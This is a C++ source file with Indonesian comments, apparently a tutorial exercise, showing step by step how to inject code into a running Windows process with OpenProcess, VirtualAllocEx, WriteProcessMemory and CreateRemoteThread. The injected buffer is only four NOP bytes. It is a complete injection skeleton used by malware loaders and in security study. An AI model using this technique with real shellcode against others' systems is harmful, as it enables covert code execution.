#include <Windows.h>
#include <iostream>


int main() {

	// Menginject arbitrary ke running process
	// Sesuaikan PID sesuai PID target

	DWORD pid = 1337;

	// contoh buffer yang akan di inject, kita inject no operation shellcode

	unsigned char myShell[] = {0x90,0x90,0x90,0x90};

	// Untuk menginject kita perlu 4 langkah
	// 1. Open process
	// 2. Alokasikan memory
	// 3. Tulis shellcode ke memory
	// 4. Running Injected code dengan membuat Thread di Running Process

	// Step 1. Open Process

	HANDLE hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,			// Perizinan untuk proses
		FALSE,						// Tidak di inherit ke child
		pid							// pid dari Proses yang akan di buka
	);

	
	// Cek jika proses gagal dibuka, maka akan return 1 ( return error )
	if (hProcess == nullptr) {
		
		std::cerr << "Failed to open Process!" << GetLastError();
		
		return 1;
	}


	// Step 2. Alokasikan memory ke Proses yang dibuka oleh OpenProcess

	LPVOID remoteMemory = VirtualAllocEx(
		hProcess,						// Proses yang akan di alokasikan memori nya
		NULL,							// Long Pointer Address ( saya belum tau apa ini )
		sizeof(myShell),				// Ukuran yang akan dialokasikan ( sesuai ukuran shellcode kita )
		MEM_COMMIT | MEM_RESERVE,		// Tipe alokasi
		PAGE_EXECUTE_READWRITE);		// Izin memory ( protect type )
	

	// Cek jika alokasi memori gagal, maka akan return error, dan tutup handle agar menghindari memori leak
	if (remoteMemory == nullptr) {
		std::cerr << "Failed to alocate memory!" << GetLastError();
		CloseHandle(hProcess);
		return 1;
	}



	// Step 3. Menuliskan shellcode ke memori yang sudah berhasil di alokasikan
	BOOL canWrite = WriteProcessMemory(
		hProcess,				// Proses yang akan ditulis shellcode
		remoteMemory,			// Memori yang akan ditulis shellcode
		myShell,				// shellcode yang akan ditulis ( bro ingat ya, tidak harus shellcode. Ini hanya contoh sederhana )
		sizeof(myShell),		// Ukuran yang akan dituliskan
		NULL);					// Print ukuran yang tertulis ke memori ( biasanya set ke NULL saja )

	// Cek jika kita gagal Menulis arbitrary ke memori, maka akan return error. Tutup handle untuk menghindari memori leak
	if (!canWrite) {
		std::cerr << "Failed to write into memory!" << GetLastError();
		CloseHandle(hProcess);
		return 1;
	}

	// Step tambahan ( baik digunakan , tapi juga optional )
	// Memaksa CPU membaca ulang instruksi yang kita tulis di memory agar tidak terjadi error 
	// Digunakan ketika kita menulis arbitrary ke memori
	// Tidak digunakan ketika kita load library, misal load file dll
	FlushInstructionCache(hProcess, remoteMemory, sizeof(myShell));


	// Step 4. Membuat Remote thread untuk mengeksekusi shellcode yang telah ditulis ke memory yang berada di process pilihan kita
	HANDLE hThread = CreateRemoteThread(
		hProcess,									// Process dimana thread akan dijalankan
		NULL,										// Security attr
		0,											// Stack size
		(LPTHREAD_START_ROUTINE)remoteMemory,		// (LPTHREAD_START_ROUTINE)Start address
		NULL,										// Parameter
		0,											// Creation Flags
		NULL										// Thread ID
	);
			
	if (hThread == nullptr) {
		std::cerr << "Failed to run thread inside process!" << GetLastError();
		CloseHandle(hProcess); // Close process handle, karena Handle thread failed, jadi tidak perlu close thread handle
		return 1;
	}

	std::cout << "Injection success!!" << std::endl;

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread); // Close thread dahulu sebelum Process
	CloseHandle(hProcess);

	return 0;

}